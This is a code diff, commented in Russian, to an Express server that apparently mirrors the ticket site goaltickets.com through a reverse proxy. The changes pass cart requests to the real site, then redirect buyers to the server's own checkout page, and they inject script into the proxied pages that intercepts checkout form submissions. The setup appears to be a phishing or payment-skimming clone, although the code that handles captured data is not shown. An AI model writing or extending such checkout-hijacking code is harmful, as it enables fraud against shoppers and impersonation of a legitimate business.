@@ -62,22 +62,28 @@ app.post('/api/*', (req, res) => {
 // Обработка POST запросов к корзине
 app.post('/cart', (req, res) => {
   console.log('🛒 Cart POST intercepted:', req.url);
-  res.status(200).json({ 
-    success: true, 
-    redirect: '/checkout',
-    message: 'Redirecting to checkout...' 
-  });
+  // Перенаправляем на checkout страницу вместо JSON
+  res.redirect('/checkout');
 });
 
 app.post('/cart/*', (req, res) => {
-  // Если это запрос на добавление в корзину, логируем и перенаправляем
+  // Если это запрос на добавление в корзину, обрабатываем как обычно
   if (req.url.includes('add') || req.url.includes('update')) {
     console.log('🛒 Cart action intercepted:', req.url);
-    res.status(200).json({ 
-      success: true, 
-      redirect: '/checkout',
-      message: 'Redirecting to checkout...' 
+    // Проксируем к оригинальному сайту для обработки
+    const { createProxyMiddleware } = require('http-proxy-middleware');
+    const cartProxy = createProxyMiddleware({
+      target: 'https://goaltickets.com',
+      changeOrigin: true,
+      secure: true,
+      onProxyRes: (proxyRes, req, res) => {
+        // После успешного добавления в корзину, перенаправляем на checkout
+        if (proxyRes.statusCode === 200) {
+          res.redirect('/checkout');
+        }
+      }
     });
+    cartProxy(req, res);
   } else {
     res.status(200).json({ success: true });
   }
@@ -86,11 +92,8 @@ app.post('/cart/*', (req, res) => {
 // Обработка POST запросов к checkout
 app.post('/checkout*', (req, res) => {
   console.log('🎯 Checkout POST intercepted:', req.url);
-  res.status(200).json({ 
-    success: true, 
-    redirect: '/checkout',
-    message: 'Redirecting to checkout...' 
-  });
+  // Перенаправляем на checkout страницу вместо JSON
+  res.redirect('/checkout');
 });
 
 app.post('/.well-known/*', (req, res) => {
@@ -184,8 +187,8 @@ const proxyOptions = {
                   const form = event.target;
                   const action = form.action?.toLowerCase() || '';
                   
-                  if (action.includes('cart') || action.includes('checkout')) {
-                    console.log('🎯 Form submission intercepted:', form);
+                  if (action.includes('checkout')) {
+                    console.log('🎯 Checkout form submission intercepted:', form);
                     event.preventDefault();
                     event.stopPropagation();
                     
@@ -203,6 +206,7 @@ const proxyOptions = {
                     
                     return false;
                   }
+                  // Для cart форм - не перехватываем, позволяем работать нормально
                 });
               }
               
